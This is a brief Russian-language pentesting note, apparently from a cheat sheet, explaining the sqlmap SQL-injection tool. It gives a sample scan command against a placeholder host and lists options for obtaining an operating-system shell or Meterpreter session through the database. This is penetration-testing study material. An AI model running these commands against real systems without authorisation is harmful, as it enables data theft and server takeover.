Цель sqlmap - обнаружить и использовать уязвимости SQL-инъекций в веб-приложениях. Обнаружив одну или несколько SQL-инъекций на целевом хосте, пользователь может выбрать один из множества вариантов: выполнить обширную проверку внутренней системы управления базами данных, получить пользователя и базу данных сеанса СУБД, перечислить пользователей, хэши паролей, привилегии, базы данных, дамп всех или определенных пользователем таблиц/колонок СУБД, запустить собственный SQL-запрос, прочитать определенные файлы в файловой системе и многое другое.

```bash
sqlmap -u http://<RHOST>/shop.php?user=1 -p user
```

Эта команда запускает инструмент SQLmap для тестирования безопасности веб-приложений. Аргумент `"-u"` указывает целевой URL, в данном случае это адрес `"http://<RHOST>/shop.php"`, за которым следует параметр запроса `"?user=1"`. Параметр `"-p user"` означает, что SQLmap должен фокусироваться на этом параметре для поиска уязвимостей. В данном случае, SQLmap будет проверять этот URL на наличие уязвимости "Blind SQL Injection" (слепое внедрение SQL-кода) в параметре "user".

Доступ к операционной системе:
    Эти параметры можно использовать для доступа к серверной системе управления базами данных, лежащей в основе операционной системы.
	`--os-shell` для интерактивной оболочки операционной системы
	`--os-pwn` для оболочки OOB, Meterpreter или VNC

Подробнее:
```bash
sqlmap -h
```
---> https://www.kali.org/tools/sqlmap/
---> https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap

# 11 Client-side Attacks

